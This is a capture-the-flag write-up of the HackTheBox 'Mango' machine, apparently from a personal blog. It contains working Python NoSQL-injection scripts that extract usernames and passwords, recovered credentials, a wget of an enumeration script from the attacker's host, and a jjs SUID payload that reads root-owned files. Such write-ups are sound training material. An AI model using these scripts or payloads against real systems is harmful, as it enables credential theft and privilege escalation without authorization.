---
Title: HackTheBox Mango
Date: 2020-08-08
Category: Challenges
Status: published
---

Mango was an interesting box when it comes to enumeration. It taught me to look more closely and not brush off anything just because I have seen it before. The box is also a prime lesson to aggregate your recon info in a structured manner so it's easier to apply it at other points when you hit a dead end somewhere. There were also some nice opportunities for small, specialised attack scripts, which I particularly enjoyed! When we start out by scanning the box, we get the following report:

```sh
# nmap -sS -sC -oN mango.nmap 10.10.10.162
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-08 13:30 GMT
Nmap scan report for 10.10.10.162
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http
|_http-title: 403 Forbidden
443/tcp open  https
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
```

When you know what to look for, it's trivial, but it took me more time than I'm willing to admit here to see the leaking domain name in the SSL certificate. Its subject points to `staging-order.mango.htb`. Port 80 is not that interesting at is just yields a permission error. Heading to the site on port 443, are are greeted with a search page:

![Image]({static}/images/screenshot-from-2019-12-08-14-32-50.png){: .image-process-article-image}

Exploring the site manually, we find an analytics frontend:

![Image]({static}/images/screenshot-from-2019-12-08-14-35-19.png){: .image-process-article-image}

On the first look, this seems to provide some interesting attack surface. Checking the source code, we only find hardcoded JSON data and file inclusions from flexmonster.com - all sample data, apparently. So we skip it as there is nothing interesting on here that is in scope. Moving on, with the `mango.htb` added to our hosts file, we can access the SSL-protected part of the site, which we got from the certificate's common name. There, we are greeted with a login panel:

![Image]({static}/images/screenshot-from-2019-12-08-17-00-27.png){: .image-process-article-image}

Logging the network requests on the page when trying some easy default candidates does not yield any success. However, thinking about the box' name, I thought that it might be a hint for MongoDB as a backend service. And the all-time classic here is attempting NoSQL injection. So I crafted a little Python script that uses form field regular expressions to enumerate the database's usernames:

```python
import requests
import string
import sys


username = ""
u = "http://staging-order.mango.htb/index.php"

def escape(c):
    return "\\" + c if c in string.punctuation else c

while True:
    sanitized = username.replace("\\", "")

    found = False
    for c in string.ascii_letters + string.digits + string.punctuation:
        esc = escape(c)
        sys.stdout.write("\r{}{}".format(sanitized, c))
        sys.stdout.flush()
        params = {
            "password[$ne]": "foo",
            "username[$regex]": "{}{}.*".format(username, esc),
            "login": "login"
        }
        r = requests.post(
            u,
            data=params,
            verify=False,
            allow_redirects=False
        )
        if r.status_code == 302:
            username += esc
            found = True
            break

    if not found:
        print("\rFound username: '{}'".format(sanitized))
        break
```

Et voilà, the usernames `mango` and `admin` show up. Armed with that knowledge, we can exploit the same vulnerability to extract the user's passwords from the database with a little variation of the above script:

```python
import requests
import string
import sys


username = "admin"
password = ""
u = "http://staging-order.mango.htb/index.php"


def escape(c):
    return "\\" + c if c in string.punctuation else c


while True:
    sanitized = password.replace("\\", "")

    found = False
    for c in string.ascii_letters + string.digits + string.punctuation:
        esc = escape(c)
        sys.stdout.write("\r{}{}".format(sanitized, c))
        sys.stdout.flush()
        params = {
            "password[$regex]": "^{}{}.*".format(password, esc),
            "username": username,
            "login": "login"
        }
        r = requests.post(
            u,
            data=params,
            verify=False,
            allow_redirects=False
        )
        if r.status_code == 302:
            password += esc
            found = True
            break

    if not found:
        print("\rFound password for {}: '{}'".format(username, sanitized))
        break
```

And we get the following output:

```
mango: h3mXK8RhU~f{\]f5H admin: t9KcS3>!0B#2
```

Logging in as either just brings us to a dead end:

![Image]({static}/images/screenshot-from-2019-12-09-12-01-55.png){: .image-process-article-image}

So we circle back to our recon results and see where we can apply this new information to make progress. Trying to log in through SSH shows that the `mango` user also exists on the server, and they have reused their password. We manage to get a shell, but no user flag. Sad. :(

But maybe the admin user exists on the machine too and just didn't enable the password on their SSH login. Running `su admin` and entering the password leads to great success and we have now secured the user flag. As admin, doing the usual enumeration game...

```sh
$ cd /tmp
$ wget 10.10.14.13/LinEnum.sh
--2019-12-09 11:34:28--  http://10.10.14.13/LinEnum.sh
Connecting to 10.10.14.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46476 (45K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh               100%[=================================>]  45.39K   138KB/s    in 0.3s

2019-12-09 11:34:28 (138 KB/s) - ‘LinEnum.sh’ saved [46476/46476]

$ chmod +x LinEnum.sh
$ ./LinEnum.sh > totallynotareport.txt
```

... we find an interesting line in the report:

```
[+] Possibly interesting SUID
files: -rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Indeed, interesting. Because `jjs` is a super easy point for privilege escalation when run with elevated privileges. And this one has an SUID flag! Reading up a bit on [GTFOBins](https://gtfobins.github.io/gtfobins/jjs/#file-read) (because no one can remember that stuff, seriousy), we craft the following payload:

```java
echo 'var BufferedReader = Java.type("java.io.BufferedReader");> var FileReader = Java.type("java.io.FileReader");> var br = new BufferedReader(new FileReader("/root/root.txt"));> while ((line = br.readLine()) != null) { print(line); }' | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
8a8ef79a7a2fbb01ea81688424e9ab15
```

And that gives us the root flag. Awesome!
